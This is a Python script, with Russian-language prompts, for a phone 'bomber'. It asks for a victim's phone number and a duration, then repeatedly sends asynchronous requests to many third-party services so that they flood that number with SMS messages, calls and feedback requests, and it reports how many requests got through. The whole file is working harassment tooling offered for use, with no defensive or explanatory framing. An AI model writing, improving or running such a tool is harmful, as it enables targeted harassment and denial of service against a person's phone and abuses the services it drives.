from Attack.Services import urls
from Attack.Feedback_Services import feedback_urls
from aiohttp import ClientSession
from asyncio import ensure_future, gather, run
import time, os


if os.name == 'nt': os.system('cls')
else: os.system('clear')


debug = True

while True:
    message = input("\n\n\n\nВведите номер телефона и время выполнения в секундах (для выхода введите 0): ").replace('+', '').replace('-', '').replace('(', '').replace(')', '')
    if message == '0': break
    count_true = 0
    count_false = 0
    number = ''.join(message.split()[:-1])
    for i in ['+', '-', '(', ')']:
        number = number.replace(i, '')
    conf = 'mix'
    attack_duration = int(message.split()[-1])

    if len(message.split()) >= 2 and attack_duration >= 20:

        async def request(session, url, conf):
            global count_false, count_true
            try:
                type_attack = ('SMS', 'CALL', 'FEEDBACK')
                if url['info']['attack'] in type_attack:
                    async with session.request(
                        url['method'],
                        url['url'],
                        params=url.get('params'),
                        cookies=url.get('cookies'),
                        headers=url.get('headers'),
                        data=url.get('data'),
                        json=url.get('json'),
                        timeout=20
                    ) as response:
                        start_time = time.time()  # Начальное время
                        end_time = start_time + attack_duration
                        if time.time() >= end_time: return
                        count_true += 1
                        if debug: print(f'URL: {url['url']}, Headers: {url.get('headers')}')
                        return await response.text()
            except Exception as e:
                count_false += 1
                if debug: print(f"Break connect: {e}")

        async def async_attacks(number, conf):
            async with ClientSession() as session:
                services = (urls(number) + feedback_urls(number)) if conf in ['feedback', 'mix'] else urls(number)
                tasks = [ensure_future(request(session, service, conf)) for service in services]
                await gather(*tasks)

        async def run_attacks():
            global count_true, count_false
            start_time = time.time()  # Начальное время
            end_time = start_time + attack_duration  # Конечное время через заданный интервал
            
            # Запуск атак до тех пор, пока текущее время меньше конечного
            while time.time() < end_time:
                await async_attacks(number, conf)

        try:
            if urls(number) and len(number) > 10:
                time_start = time.time()
                print(f"Вы успешно запустили бомбер на номер {number} на +-{attack_duration} секунд")
                run(run_attacks())
                time_stop = time.time()
                
                # Вывод результатов
                print(f'''
Результаты выполнения атаки:

    Время выполнения атаки: {time_stop - time_start:.2f} секунд
    Успешно посещенных сайтов: {count_true}
    Не посещенных сайтов: {count_false}
''')
            else: print("Вы ввели неверный номер телефона!")
        except:
            print("Вы ввели неверный номер телефона!")

    else:
        print("Время бомбера не должно быть меньше 20с")
